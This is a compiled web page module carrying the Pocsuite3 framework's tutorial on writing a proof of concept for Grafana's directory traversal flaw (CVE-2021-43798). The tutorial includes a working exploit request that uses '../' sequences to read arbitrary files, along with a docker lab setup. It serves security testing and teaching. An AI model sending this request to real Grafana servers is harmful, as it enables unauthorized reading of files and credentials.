import{_ as s,a,b as n,c as l}from"./chunks/poc-demo-cve-2021-43798_requests.b44fa864.js";import{_ as o,j as p,g as e,H as r}from"./chunks/framework.8815fd6f.js";const h=JSON.parse('{"title":"Grafana Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798)","description":"","frontmatter":{},"headers":[{"level":2,"title":"PoC development","slug":"poc-development"},{"level":2,"title":"Preparing the vulnerable environment","slug":"preparing-the-vulnerable-environment"},{"level":2,"title":"Vulnerability verification","slug":"vulnerability-verification"}],"relativePath":"en/guide/poc-demo-cve-2021-43798.md","lastUpdated":1658474088000}'),t={name:"en/guide/poc-demo-cve-2021-43798.md"},c=r(`<h1 id="grafana-unauthorized-arbitrary-file-read-vulnerability-cve-2021-43798" tabindex="-1">Grafana Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798) <a class="header-anchor" href="#grafana-unauthorized-arbitrary-file-read-vulnerability-cve-2021-43798" aria-hidden="true">#</a></h1><p>Vulnerability details: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798" target="_blank" rel="noreferrer">Grafana File Reading Vulnerability Analysis and Summary (CVE-2021-43798)</a></p><p>Grafana is a multi-platform open source analytics and interactive visualization web application. It provides charts, graphs, and alerts for the web when connected to supported data sources.</p><p>Grafana versions <code>8.0.0-beta1</code> through <code>8.3.0</code> (except for patched versions) is vulnerable to directory traversal, allowing access to local files.</p><h2 id="poc-development" tabindex="-1">PoC development <a class="header-anchor" href="#poc-development" aria-hidden="true">#</a></h2><p>Generate template.</p><div class="language-bash"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">\u279C pocsuite --new</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"><span style="color:#A6ACCD;">-----</span></span>
<span class="line"><span style="color:#A6ACCD;">Seebug ssvid </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 99335</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">0</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: 99398</span></span>
<span class="line"><span style="color:#A6ACCD;">PoC author </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, Seebug</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: Seebug</span></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability disclosure date </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 2021-8-18</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">2022-07-11</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: 2021-12-07</span></span>
<span class="line"><span style="color:#A6ACCD;">Advisory URL </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, https://www.seebug.org/vuldb/ssvid-99335</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">https://www.seebug.org/vuldb/ssvid-99398</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability CVE number </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, CVE-2021-22123</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: CVE-2021-43798</span></span>
<span class="line"><span style="color:#A6ACCD;">Vendor name </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, Fortinet</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">Product or component name </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, FortiWeb</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: Grafana</span></span>
<span class="line"><span style="color:#A6ACCD;">Affected version </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;">=6.4.0</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;">=8.3.0</span></span>
<span class="line"><span style="color:#A6ACCD;">Vendor homepage </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, https://www.fortinet.com</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: https://grafana.com</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">0    Arbitrary File Read</span></span>
<span class="line"><span style="color:#A6ACCD;">1    Code Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">2    Command Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">3    Denial Of service</span></span>
<span class="line"><span style="color:#A6ACCD;">4    Information Disclosure</span></span>
<span class="line"><span style="color:#A6ACCD;">5    Login Bypass</span></span>
<span class="line"><span style="color:#A6ACCD;">6    Path Traversal</span></span>
<span class="line"><span style="color:#A6ACCD;">7    SQL Injection</span></span>
<span class="line"><span style="color:#A6ACCD;">8    SSRF</span></span>
<span class="line"><span style="color:#A6ACCD;">9    XSS</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability type, choose from above or provide </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 3</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: 0</span></span>
<span class="line"><span style="color:#A6ACCD;">Authentication Required </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, yes</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">no</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: no</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"></span></code></pre></div><p>Modify the <code>_exploit</code> method based on the disclosed vulnerability details.</p><div class="language-diff"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">     def _exploit(self, param=&#39;&#39;):</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        if not self._check(dork=&#39;&#39;):</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        if not self._check(dork=&#39;Grafana&#39;, allow_redirects=True):</span></span>
<span class="line"><span style="color:#A6ACCD;">             return False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        headers = {&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;}</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        payload = &#39;a=b&#39;</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        res = requests.post(self.url, headers=headers, data=payload)</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        res = requests.get(f&#39;{self.url}/public/plugins/grafana/../../../../../../../..{param}&#39;)</span></span>
<span class="line"><span style="color:#A6ACCD;">         logger.debug(res.text)</span></span>
<span class="line"><span style="color:#A6ACCD;">         return res.text</span></span>
<span class="line"></span></code></pre></div><h2 id="preparing-the-vulnerable-environment" tabindex="-1">Preparing the vulnerable environment <a class="header-anchor" href="#preparing-the-vulnerable-environment" aria-hidden="true">#</a></h2><div class="language-bash"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">\u250C\u2500\u2500</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">kali\u327Fkali</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;">-</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">~</span><span style="color:#89DDFF;">]</span></span>
<span class="line"><span style="color:#A6ACCD;">\u2514\u2500$ docker run -it --rm -p 3000:3000 pocsuite3/cve-2021-43798</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">WARN</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> falling back to legacy setting of </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">min_interval_seconds</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">;</span><span style="color:#A6ACCD;"> please use the configuration option </span><span style="color:#89DDFF;font-style:italic;">in</span><span style="color:#A6ACCD;"> the </span><span style="color:#89DDFF;">\`</span><span style="color:#C3E88D;">unified_alerting</span><span style="color:#89DDFF;">\`</span><span style="color:#A6ACCD;"> section </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> Grafana 8 alerts are enabled. logger=settings</span></span>
<span class="line"><span style="color:#A6ACCD;">WARN</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> falling back to legacy setting of </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">min_interval_seconds</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">;</span><span style="color:#A6ACCD;"> please use the configuration option </span><span style="color:#89DDFF;font-style:italic;">in</span><span style="color:#A6ACCD;"> the </span><span style="color:#89DDFF;">\`</span><span style="color:#C3E88D;">unified_alerting</span><span style="color:#89DDFF;">\`</span><span style="color:#A6ACCD;"> section </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> Grafana 8 alerts are enabled. logger=settings</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Config loaded from                       logger=settings file=/usr/share/grafana/conf/defaults.ini</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Config loaded from                       logger=settings file=/etc/grafana/grafana.ini</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Config overridden from </span><span style="color:#82AAFF;">command</span><span style="color:#A6ACCD;"> line      logger=settings arg=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">default.paths.data=/var/lib/grafana</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Config overridden from </span><span style="color:#82AAFF;">command</span><span style="color:#A6ACCD;"> line      logger=settings arg=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">default.paths.logs=/var/log/grafana</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Config overridden from </span><span style="color:#82AAFF;">command</span><span style="color:#A6ACCD;"> line      logger=settings arg=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">default.paths.plugins=/var/lib/grafana/plugins</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Config overridden from </span><span style="color:#82AAFF;">command</span><span style="color:#A6ACCD;"> line      logger=settings arg=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">default.paths.provisioning=/etc/grafana/provisioning</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Config overridden from </span><span style="color:#82AAFF;">command</span><span style="color:#A6ACCD;"> line      logger=settings arg=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">default.log.mode=console</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Config overridden from Environment variable logger=settings var=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">GF_PATHS_DATA=/var/lib/grafana</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Config overridden from Environment variable logger=settings var=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">GF_PATHS_LOGS=/var/log/grafana</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Config overridden from Environment variable logger=settings var=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">GF_PATHS_PLUGINS=/var/lib/grafana/plugins</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Config overridden from Environment variable logger=settings var=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">GF_PATHS_PROVISIONING=/etc/grafana/provisioning</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Path Home                                logger=settings path=/usr/share/grafana</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Path Data                                logger=settings path=/var/lib/grafana</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Path Logs                                logger=settings path=/var/log/grafana</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Path Plugins                             logger=settings path=/var/lib/grafana/plugins</span></span>
<span class="line"><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">07-14</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">22:50:26</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Path Provisioning                        logger=settings path=/etc/grafana/provisioning</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"></span></code></pre></div><h2 id="vulnerability-verification" tabindex="-1">Vulnerability verification <a class="header-anchor" href="#vulnerability-verification" aria-hidden="true">#</a></h2><p>Verify mode works fine.</p><p><img src="`+s+'" alt=""></p><p>Adding the <code>-o a.json</code> parameter can save the result as a file in JSON Lines format.</p><p><img src="'+a+'" alt=""></p><p>Attack mode, get the file path from the command line and return the file content.</p><p><img src="'+n+'" alt=""></p><p>For the directory traversal vulnerability, one bad thing is that <code>urlib3&gt;1.24.3</code> will delete <code>../</code> from the request URL, which affects many security tools. See issue: <a href="https://github.com/urllib3/urllib3/issues/1790" target="_blank" rel="noreferrer">Issue with Parsing URIs - Breaks Security Tools when testing for Path Traversal</a></p><p>Pocsuite3 hooks part of the code of urllib3 and requests, supports <code>../</code>, and the encoding of special characters is cancelled.</p><p><img src="'+l+'" alt=""></p>',21),D=[c];function i(y,C,A,F,d,g){return e(),p("div",null,D)}var v=o(t,[["render",i]]);export{h as __pageData,v as default};
